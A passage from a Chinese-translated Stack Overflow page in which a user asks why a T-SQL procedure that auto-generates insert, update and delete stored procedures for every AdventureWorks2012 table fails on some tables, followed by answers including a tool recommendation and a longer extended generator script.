return false; 
} 
```

为什么你`apass`每次都制作新变量？

# sql-server - 存储过程动态创建插入、更新、删除存储过程

> ID：13429773
> 
> 赞同：0
> 
> 时间：2012-11-17T10:39:26.120
> 
> 标签：sql-server, tsql, stored-procedures

我有一个如下所示的存储过程，它为所有现有表自动创建插入、更新、删除存储过程。但它不适用于`AdventureWorks2012`数据库中的所有表。任何想法？

```
 USE [AdventureWorks2012]
GO
/****** Object:  StoredProcedure [dbo].[sp_et_create_sps_for_table]    Script Date: 11/16/2012 10:28:55 PM ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
ALTER PROCEDURE [dbo].[sp_et_create_sps_for_table]
AS
BEGIN
DECLARE Tables_cursor CURSOR
FOR
SELECT TABLE_SCHEMA,TABLE_NAME
From INFORMATION_SCHEMA.TABLES
where TABLE_TYPE='BASE TABLE'
OPEN Tables_cursor
DECLARE @Table_Schema nvarchar(50),@Table_Name nvarchar(50)
Fetch next
from Tables_cursor
INTO @Table_Schema,@Table_Name
WHILE @@FETCH_STATUS=0
BEGIN
    DECLARE @tblName Varchar(50)
    set @tblName=@Table_Schema+'.'+@Table_Name;
    print @tblName
    --set @tblName='Sales.SpecialOffer'
Declare @dbName Varchar(50)
Declare @insertSPName Varchar(50), @updateSPName Varchar(50), @deleteSPName Varchar(50) ;
Declare @tablColumnParameters Varchar(1000), @tableColumns Varchar(1000),@tableColumnVariables Varchar(1000);
Declare @tableCols Varchar(1000), @tablinsertParameters Varchar(1000);
Declare @space Varchar(50) ;
Declare @colName Varchar(100) ;
Declare @colVariable Varchar(100) ;
Declare @colParameter Varchar(100) ;
Declare @strSpText Varchar(4000);
Declare @updCols Varchar(2000);
Declare @delParamCols Varchar(2000);
Declare @whereCols Varchar(2000);
Set @tblName = SubString(@tblName,CharIndex('.',@tblName)+1, Len(@tblName))
Set @insertSPName = '[dbo].[sp_' + lower(@tblName) +'_insert]' ;
Set @updateSPName = '[dbo].[sp_' + lower(@tblName) +'_update]' ;
Set @deleteSPName = '[dbo].[sp_' + lower(@tblName) +'_delete]' ;
Set @space = REPLICATE(' ', 4) ;
--print @space+'dd';
Set @tablColumnParameters = '' ;
Set @tableColumns = '' ;
Set @tableColumnVariables = '' ;
Set @strSPText = '' ;
Set @tableCols = '' ;
Set @updCols = '' ;
Set @delParamCols = '' ;
Set @whereCols = '' ;
SET NOCOUNT ON

-- Get all Primary KEY columns & data types for a table
SELECT t.name as 'Table',
c.colid ,
'[' + c.name + ']' as 'ColumnName',
'@'+c.name as 'ColumnVariable',
systypes.name +
Case When systypes.xusertype in (165,167,175,231,239 ) Then '(' + Convert(varchar(10),c.length) +')' Else '' end as 'DataType' ,
'@'+c.name + ' ' + systypes.name +
Case When systypes.xusertype in (165,167,175,231,239 ) Then '(' + Convert(varchar(10),c.length) +')' Else '' end as 'ColumnParameter'
Into #tmp_PK_Structure
FROM sysindexes i, sysobjects t, sysindexkeys k, syscolumns c, systypes
WHERE i.id = t.id AND
i.indid = k.indid AND i.id = k.ID And
c.id = t.id AND c.colid = k.colid AND
i.indid BETWEEN 1 And 254 AND
c.xusertype = systypes.xusertype AND
(i.status & 2048) = 2048 AND t.id = OBJECT_ID(@tblName)

SELECT distinct
sysobjects.name as 'Table',
syscolumns.colid ,
'[' + syscolumns.name + ']' as 'ColumnName',
'@'+syscolumns.name as 'ColumnVariable',
systypes.name +
Case When systypes.xusertype in (165,167,175,231,239 ) Then '(' + Convert(varchar(10),Case When syscolumns.length=-1 Then 4000 else syscolumns.length end) +')' Else '' end as 'DataType' ,
'@'+syscolumns.name + ' ' + systypes.name +
Case When systypes.xusertype in (165,167,175,231,239 ) Then '(' + Convert(varchar(10),Case When syscolumns.length=-1 Then 4000 else syscolumns.length end) +')' Else '' end as 'ColumnParameter'
Into #tmp_Structure
From sysobjects , syscolumns , systypes
Where sysobjects.id = syscolumns.id
and syscolumns.xusertype = systypes.xusertype
and sysobjects.xtype = 'u'
and sysobjects.name = @tblName
and syscolumns.name!=(SELECT
c.name AS ColumnName
FROM sys.columns AS c
INNER JOIN
sys.tables AS t
ON t.[object_id] = c.[object_id]
where c.is_identity = 1
and t.name=@tblName)
Order by syscolumns.colid

SELECT distinct
sysobjects.name as 'Table',
syscolumns.colid ,
'[' + syscolumns.name + ']' as 'ColumnName',
'@'+syscolumns.name as 'ColumnVariable',
systypes.name +
Case When systypes.xusertype in (165,167,175,231,239 ) Then '(' + Convert(varchar(10),Case When syscolumns.length=-1 Then 4000 else syscolumns.length end) +')' Else '' end as 'DataType' ,
'@'+syscolumns.name + ' ' + systypes.name +
Case When systypes.xusertype in (165,167,175,231,239 ) Then '(' + Convert(varchar(10),Case When syscolumns.length=-1 Then 4000 else syscolumns.length end) +')' Else '' end as 'ColumnParameter'
Into #tmp_Structure1
From sysobjects , syscolumns , systypes
Where sysobjects.id = syscolumns.id
and syscolumns.xusertype = systypes.xusertype
and sysobjects.xtype = 'u'
and sysobjects.name = @tblName
Order by syscolumns.colid
--END

/* Read the table structure and populate variables*/
Declare SpText_Cursor Cursor For
Select ColumnName, ColumnVariable, ColumnParameter
From #tmp_Structure

Open SpText_Cursor

Fetch Next From SpText_Cursor Into @colName, @colVariable, @colParameter
While @@FETCH_STATUS = 0
Begin
Set @tableColumns = @tableColumns + @colName + CHAR(13) + @space + @space + ',' ;
Set @tablColumnParameters = @tablColumnParameters + @colParameter + CHAR(13) + @space + ',' ;
Set @tableColumnVariables = @tableColumnVariables + @colVariable + CHAR(13) + @space + @space + ',' ;
Set @tableCols = @tableCols + @colName + ',' ;
Set @updCols = @updCols + @colName + ' = ' + @colVariable + CHAR(13) + @space + @space + ',' ;
Fetch Next From SpText_Cursor Into @colName, @colVariable, @colParameter
End

Close SpText_Cursor
Deallocate SpText_Cursor

/* for update parameter*/

if exists(select * from #tmp_PK_Structure)
BEGIN
Set @tablinsertParameters=''
Declare SpText_Cursor1 Cursor For
Select ColumnParameter
From #tmp_Structure1

Open SpText_Cursor1

Fetch Next From SpText_Cursor1 Into @colParameter
While @@FETCH_STATUS = 0
Begin

Set @tablinsertParameters = @tablinsertParameters + @colParameter + CHAR(13) + @space + ',' ;
Fetch Next From SpText_Cursor1 Into @colParameter
End

Close SpText_Cursor1
Deallocate SpText_Cursor1
END
/*end for update parameter*/

/* Read the Primary Keys from the table and populate variables*/
Declare SpPKText_Cursor Cursor For
Select ColumnName, ColumnVariable, ColumnParameter
From #tmp_PK_Structure

Open SpPKText_Cursor

Fetch Next From SpPKText_Cursor Into @colName, @colVariable, @colParameter
While @@FETCH_STATUS = 0
Begin
Set @delParamCols = @delParamCols + @colParameter + CHAR(13) + @space + ',' ;
Set @whereCols = @whereCols + @colName + ' = ' + @colVariable + ' AND ' ;
Fetch Next From SpPKText_Cursor Into @colName, @colVariable, @colParameter
End

Close SpPKText_Cursor
Deallocate SpPKText_Cursor

If (LEN(@tablinsertParameters)>0)
Set @tablinsertParameters = LEFT(@tablinsertParameters,LEN(@tablinsertParameters)-1) ;

-- Stored procedure scripts starts here
If (LEN(@tablColumnParameters)>0)
Begin
Set @tablColumnParameters = LEFT(@tablColumnParameters,LEN(@tablColumnParameters)-1) ;
Set @tableColumnVariables = LEFT(@tableColumnVariables,LEN(@tableColumnVariables)-1) ;
Set @tableColumns = LEFT(@tableColumns,LEN(@tableColumns)-1) ;
Set @tableCols = LEFT(@tableCols,LEN(@tableCols)-1) ;
Set @updCols = LEFT(@updCols,LEN(@updCols)-1) ;

If (LEN(@whereCols)>0)
Begin
Set @whereCols = 'WHERE ' + LEFT(@whereCols,LEN(@whereCols)-4) ;
Set @delParamCols = LEFT(@delParamCols,LEN(@delParamCols)-1) ;
End

/* Create INSERT stored procedure for the table if it does not exist */
IF Not EXISTS (SELECT * FROM dbo.sysobjects WHERE id = OBJECT_ID(@insertSPName) AND OBJECTPROPERTY(id,N'IsProcedure') = 1)
Begin
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + '/*-- ============================================='
Set @strSPText = @strSPText + CHAR(13) + '-- Author : dbo'
Set @strSPText = @strSPText + CHAR(13) + '-- Create date : ' + Convert(varchar(20),Getdate())
Set @strSPText = @strSPText + CHAR(13) + '-- Description : Insert Procedure for ' + @tblName
Set @strSPText = @strSPText + CHAR(13) + '-- Exec ' + @insertSPName + ' ' + @tableCols
Set @strSPText = @strSPText + CHAR(13) + '-- ============================================= */'
Set @strSPText = @strSPText + CHAR(13) + 'CREATE PROCEDURE ' + @insertSPName

if exists(select * from #tmp_PK_Structure)
Set @strSPText = @strSPText + CHAR(13) + @space + ' ' + @tablColumnParameters
else
Set @strSPText = @strSPText + CHAR(13) + @space + ' ' + @tablinsertParameters

Set @strSPText = @strSPText + CHAR(13) + 'AS'
Set @strSPText = @strSPText + CHAR(13) + 'BEGIN'
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + @space + 'INSERT INTO [dbo].['+@tblName +']'
Set @strSPText = @strSPText + CHAR(13) + @space + '( '
Set @strSPText = @strSPText + CHAR(13) + @space + @space + ' ' + @tableColumns
Set @strSPText = @strSPText + CHAR(13) + @space + ')'
Set @strSPText = @strSPText + CHAR(13) + @space + 'VALUES'
Set @strSPText = @strSPText + CHAR(13) + @space + '('
Set @strSPText = @strSPText + CHAR(13) + @space + @space + ' ' + @tableColumnVariables
Set @strSPText = @strSPText + CHAR(13) + @space + ')'
Set @strSPText = @strSPText + CHAR(13) + 'END'
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + ''
print '-------------------------------------------------'
Print @strSPText;
print '-------------------------------------------------'
Exec(@strSPText);

if (@@ERROR=0)
Print 'Procedure ' + @insertSPName + ' Created Successfully '
End
Else
Begin
Print 'Sorry!! ' + @insertSPName + ' Already exists in the database. '
End
/* Create UPDATE stored procedure for the table if it does not exist */
IF Not EXISTS (SELECT * FROM dbo.sysobjects WHERE id = OBJECT_ID(@updateSPName) AND OBJECTPROPERTY(id,N'IsProcedure') = 1)
Begin
Set @strSPText = ''
Set @strSPText = @strSPText + CHAR(13) + '/*-- ============================================='
Set @strSPText = @strSPText + CHAR(13) + '-- Author : dbo'
Set @strSPText = @strSPText + CHAR(13) + '-- Create date : ' + Convert(varchar(20),Getdate())
Set @strSPText = @strSPText + CHAR(13) + '-- Description : Update Procedure for ' + @tblName
Set @strSPText = @strSPText + CHAR(13) + '-- Exec ' + @updateSPName + ' ' + @tableCols
Set @strSPText = @strSPText + CHAR(13) + '-- ============================================= */'
Set @strSPText = @strSPText + CHAR(13) + 'CREATE PROCEDURE ' + @updateSPName

if exists(select * from #tmp_PK_Structure)
Set @strSPText = @strSPText + CHAR(13) + @space + ' ' + @tablinsertParameters
else
Set @strSPText = @strSPText + CHAR(13) + @space + ' ' + @tablColumnParameters
--Set @strSPText = @strSPText + CHAR(13) + @space + ' ' + @tablColumnParameters

Set @strSPText = @strSPText + CHAR(13) + 'AS'
Set @strSPText = @strSPText + CHAR(13) + 'BEGIN'
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + @space + 'UPDATE [dbo].['+@tblName +']'
Set @strSPText = @strSPText + CHAR(13) + @space + 'SET '
Set @strSPText = @strSPText + CHAR(13) + @space + @space + ' ' + @updCols
Set @strSPText = @strSPText + CHAR(13) + @space + @whereCols
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + 'END'
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + ''

print '-------------------------------------------------'
Print @strSPText ;
print '-------------------------------------------------'
Exec(@strSPText);

if (@@ERROR=0)
Print 'Procedure ' + @updateSPName + ' Created Successfully '
End
Else
Begin
Print 'Sorry!! ' + @updateSPName + ' Already exists in the database. '
End
/* Create DELETE stored procedure for the table if it does not exist */
IF Not EXISTS (SELECT * FROM dbo.sysobjects WHERE id = OBJECT_ID(@deleteSPName) AND OBJECTPROPERTY(id,N'IsProcedure') = 1)
Begin
Set @strSPText = ''
Set @strSPText = @strSPText + CHAR(13) + '/*-- ============================================='
Set @strSPText = @strSPText + CHAR(13) + '-- Author : dbo'
Set @strSPText = @strSPText + CHAR(13) + '-- Create date : ' + Convert(varchar(20),Getdate())
Set @strSPText = @strSPText + CHAR(13) + '-- Description : Delete Procedure for ' + @tblName
Set @strSPText = @strSPText + CHAR(13) + '-- Exec ' + @deleteSPName + ' ' + @delParamCols
Set @strSPText = @strSPText + CHAR(13) + '-- ============================================= */'
Set @strSPText = @strSPText + CHAR(13) + 'CREATE PROCEDURE ' + @deleteSPName
Set @strSPText = @strSPText + CHAR(13) + @space + ' ' + @delParamCols
Set @strSPText = @strSPText + CHAR(13) + 'AS'
Set @strSPText = @strSPText + CHAR(13) + 'BEGIN'
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + @space + 'DELETE FROM [dbo].['+@tblName +']'
Set @strSPText = @strSPText + CHAR(13) + @space + @whereCols
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + 'END'
Set @strSPText = @strSPText + CHAR(13) + ''
Set @strSPText = @strSPText + CHAR(13) + ''
print '-------------------------------------------------'
Print @strSPText ;
print '-------------------------------------------------'
Exec(@strSPText);

if (@@ERROR=0)
Print 'Procedure ' + @deleteSPName + ' Created Successfully '
End
Else
Begin
Print 'Sorry!! ' + @deleteSPName + ' Already exists in the database. '
End
End
Drop table #tmp_Structure
Drop table #tmp_Structure1
Drop table #tmp_PK_Structure
    Fetch next
from Tables_cursor
INTO @Table_Schema,@Table_Name
END
CLOSE Tables_cursor
DEALLOCATE Tables_cursor
END 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T11:14:04.843

[ssms 工具包](http://www.ssmstoolspack.com/)包含一个工具来做同样的事情（完美）。

![在此处输入图像描述](../Images/9f66e8c7f0e8ff441041d2a8f0654880.png)

右键单击表，SSMS 工具，创建 CRUD。如果您想从问题中学习，它不能正确回答您的问题（“为什么这不起作用”），但如果您只想让它工作，它可以节省您重新发明轮子。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T08:44:54.833

将**USE [AdventureWorks2012]**替换为将使用的数据库名称。

我已经对其进行了测试，为所有表创建了存储过程。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-11-30T16:15:01.840

程序到此结束：

```
If (LEN(@ColumnParametersInsert)>0)
    Begin

      Set @ColumnParametersInsert = LEFT(@ColumnParametersInsert,LEN(@ColumnParametersInsert)-3) ;
      SET @LastPosOfComma = LEN(@ColumnParametersInsertForExec) - CHARINDEX(' ,',REVERSE(@ColumnParametersInsertForExec))
      SET @ColumnParametersInsertForExec = LEFT(@ColumnParametersInsertForExec,@LastPosOfComma+3) + SUBSTRING(@ColumnParametersInsertForExec,@LastPosOfComma+5,40000);

      Set @ColumnParametersDelete = LEFT(@ColumnParametersDelete,LEN(@ColumnParametersDelete)-4) ;
      SET @LastPosOfComma = LEN(@ColumnParametersDeleteForExec) - CHARINDEX(' ,',REVERSE(@ColumnParametersDeleteForExec))
      SET @ColumnParametersDeleteForExec = LEFT(@ColumnParametersDeleteForExec,@LastPosOfComma+3) + SUBSTRING(@ColumnParametersDeleteForExec,@LastPosOfComma+5,40000);

      SET @ColumnParametersList = LEFT(@ColumnParametersList,LEN(@ColumnParametersList)-3) ;
      SET @LastPosOfComma = LEN(@ColumnParametersListForExec) - CHARINDEX(' ,',REVERSE(@ColumnParametersListForExec))
      SET @ColumnParametersListForExec = LEFT(@ColumnParametersListForExec,@LastPosOfComma+3) + SUBSTRING(@ColumnParametersListForExec,@LastPosOfComma+5,40000);

      IF LEN(@ColumnInValueForInsert)>0
        Set @ColumnInValueForInsert = LEFT(@ColumnInValueForInsert,LEN(@ColumnInValueForInsert)-3) ;
      IF LEN(@ColumnDefForInsert)>0
        Set @ColumnDefForInsert = LEFT(@ColumnDefForInsert,LEN(@ColumnDefForInsert)-3) ;
      IF LEN(@tableCols)>0
        Set @tableCols = LEFT(@tableCols,LEN(@tableCols)-1) ;
      IF LEN(@updCols)>0
        Set @updCols = LEFT(@updCols,LEN(@updCols)-3) ;
      SET @tableColumnForWhereInListVariables = LEFT(@tableColumnForWhereInListVariables,LEN(@tableColumnForWhereInListVariables)-3)
      SET @tableColumnForWhereInListAffectVariables = LEFT(@tableColumnForWhereInListAffectVariables,LEN(@tableColumnForWhereInListAffectVariables)-3) ;

    END

    If (LEN(@whereCols)>0)
      Set @whereCols = 'WHERE ' + LEFT(@whereCols,LEN(@whereCols)-4) ;
    ELSE
       Set @whereCols = 'WHERE 1=0 --Too dangerous to do update or delete on all the table'

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- ============================================='
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Author : ' + SYSTEM_USER
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Create date : ' + Convert(varchar(20),Getdate())
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Description : Insert Procedure for ' + @CurrentTableName    
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- ============================================='

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'IF OBJECT_ID(''' + REPLACE(@insertSPName,'''','''''') + ''',''P'') IS NOT NULL'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '   DROP PROCEDURE  ' + @insertSPName 
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'GO'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + ''
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + ''

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'CREATE PROCEDURE ' + @insertSPName
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + '' + @ColumnParametersInsert   
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @strBegin
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @spaceForTrans + 'INSERT INTO ' + @CurrentFullTableName + '('
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @spaceForTrans + '    ' + '' + @ColumnDefForInsert + ')'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @spaceForTrans + 'VALUES ('
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @spaceForTrans + '    ' + '' + @ColumnInValueForInsert + ')'

    IF @NbPrimaryKey =1 --No return if 2 or 0 primarykeys 
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @spaceForTrans + 'SELECT SCOPE_IDENTITY() AS ' + @LastPrimaryKey

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @strEnd

    Set @strSPText = @strSPText + @SetVariablesForExec
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'EXEC ' + @insertSPName + ' '  + @ColumnParametersInsertForExec
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'GO'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'SELECT * FROM ' + @CurrentFullTableName + ' ORDER BY 1 DESC'
    IF @UnCommentExecForDebug = 0 Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '*/'

    INSERT INTO @StatementList (FullTableName,StatementType,Statement) VALUES (@CurrentFullTableName,'Insert',@strSPText)

    Set @strSPText = ''
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- ============================================='
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Author : ' + SYSTEM_USER
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Create date : ' + Convert(varchar(20),Getdate())
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Description : Update Procedure for ' + @CurrentTableName
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- ============================================='

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'IF OBJECT_ID(''' + REPLACE(@updateSPName,'''','''''') + ''',''P'') IS NOT NULL'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '   DROP PROCEDURE  ' + @updateSPName 
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'GO'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + ''
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + ''

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'CREATE PROCEDURE ' + @updateSPName
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + '' + @ColumnParametersUpdate
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @strBegin
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @spaceForTrans+ 'UPDATE ' + @CurrentFullTableName 
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @spaceForTrans+ '   SET ' + @updCols
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @spaceForTrans+ ' ' + @whereCols
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @strEnd
    Set @strSPText = @strSPText + @SetVariablesForExec  + @SetVariablesForExecUpdate  
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'EXEC ' + @updateSPName + ' ' + @ColumnParametersUpdateForExec
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'SELECT * FROM ' + @CurrentFullTableName + ' '
    IF @UnCommentExecForDebug = 0 Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '*/'

    INSERT INTO @StatementList (FullTableName,StatementType,Statement) VALUES (@CurrentFullTableName,'Update',@strSPText)

    Set @strSPText = ''
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- ============================================='
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Author : ' + SYSTEM_USER
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Create date : ' + Convert(varchar(20),Getdate())
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Description : Delete Procedure for ' + @CurrentTableName
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- ============================================='

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'IF OBJECT_ID(''' + REPLACE(@deleteSPName,'''','''''') + ''',''P'') IS NOT NULL'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '   DROP PROCEDURE  ' + @deleteSPName 
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'GO'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + ''
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + ''

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'CREATE PROCEDURE ' + @deleteSPName
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + '' + @ColumnParametersDelete
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @strBegin
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + 'DELETE FROM ' + @CurrentFullTableName
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + ' ' + @whereCols
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @strEnd
    Set @strSPText = @strSPText + @SetVariablesForExecDelete
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'EXEC ' + @deleteSPName + ' ' + @ColumnParametersDeleteForExec
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'GO'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'SELECT * FROM ' + @CurrentFullTableName + ' ORDER BY 1 DESC'
    IF @UnCommentExecForDebug = 0 Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '*/'

    INSERT INTO @StatementList (FullTableName,StatementType,Statement) VALUES (@CurrentFullTableName,'Delete',@strSPText)

    Set @strSPText = ''
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- ============================================='
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Author : ' + SYSTEM_USER
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Create date : ' + Convert(varchar(20),Getdate())
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- Description : List Procedure for ' + @CurrentFullTableName
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '-- ============================================='

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'IF OBJECT_ID(''' + REPLACE(@listSPName,'''','''''') + ''',''P'') IS NOT NULL'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '   DROP PROCEDURE  ' + @listSPName 
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'GO'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + ''

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'CREATE PROCEDURE ' + @listSPName
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + '' + @ColumnParametersList
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @strBegin
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space +'   DECLARE @Separator  nvarchar(20) =''
     WHERE '''
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space +'   DECLARE @SeparatorAnd  nvarchar(20) =''
       AND '''
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space +'   DECLARE @Statement nvarchar(max) =''SELECT * 
      FROM ' + REPLACE(@CurrentFullTableName,'''','''''') + '''' + @tableColumnForWhereInList

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + ' --PRINT @Statement'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + ' BEGIN TRY'

    IF @GenerateDebugScriptForList=1
    BEGIN
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '    IF 1=0--DEBUG --TODO: verify if not set for final version'
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '      BEGIN'
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '          DECLARE @FullQueryForDebug nvarchar(max)=' + @DebugVariablesForList
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '            CHAR(13) +CHAR(10) + @Statement'
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '  '
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '         --PRINT @FullQueryForDebug'
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '         --EXEC [K2FranceDebugDB].dbo.K2FranceDebug  ''@FullQueryForDebug DIRECT'', @FullQueryForDebug'
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '         --EXEC loopbackServerForDebug.[K2FranceDebugDB].dbo.K2FranceDebug  ''@FullQueryForDebug loopback'', @FullQueryForDebug'
      Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '      END'
    END
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '     exec sp_executesql @Statement ,N''' + @tableColumnForWhereInListVariables + ''',' + @tableColumnForWhereInListAffectVariables
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + ' END TRY'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + ' BEGIN CATCH'

    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '   DECLARE @ErrorToDisplay nvarchar(max)= ''Error trying to execute Query Error number:'' + CAST(ERROR_NUMBER() AS nvarchar(max)) + 
                        --'' Error severity:'' + ISNULL(CAST(ERROR_SEVERITY() AS nvarchar(max)),'''') + 
                        --'' Error state:'' + ISNULL(CAST(ERROR_STATE() AS nvarchar(max)),'''')  + 
                        --'' Error procedure:'' + ISNULL(CAST(ERROR_PROCEDURE() AS nvarchar(max)),'''')  + 
                        --'' Error line:'' + ISNULL(CAST(ERROR_LINE() AS nvarchar(max)),'''')  + 
                        '' Error message:'' + ISNULL(CAST(ERROR_MESSAGE() AS nvarchar(max)),'''')
'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + '   RAISERROR(@ErrorToDisplay, 16, 1);'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @space + @space  + @spaceForTrans + ' END CATCH'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + @strEnd
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'EXEC ' + @listSPName + ' ' + @ColumnParametersListForExec
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'GO'
    Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + 'SELECT * FROM ' + @CurrentFullTableName + ' ORDER BY 1'
    IF @UnCommentExecForDebug = 0 Set @strSPText = @strSPText + CHAR(13) + CHAR(10) + '*/'

    INSERT INTO @StatementList (FullTableName,StatementType,Statement) VALUES (@CurrentFullTableName,'List',@strSPText)

    Drop table #tmp_Structure   
    Fetch next from Tables_cursor INTO @CurrentSchemaName,@CurrentTableName
END
CLOSE Tables_cursor
DEALLOCATE Tables_cursor

SET @DropStatement = '

------------------------------------------- TO CLEAN COMPLETELY THE APPLICATION ---------------------------------------
/*' + @DropStatement +'
*/' 
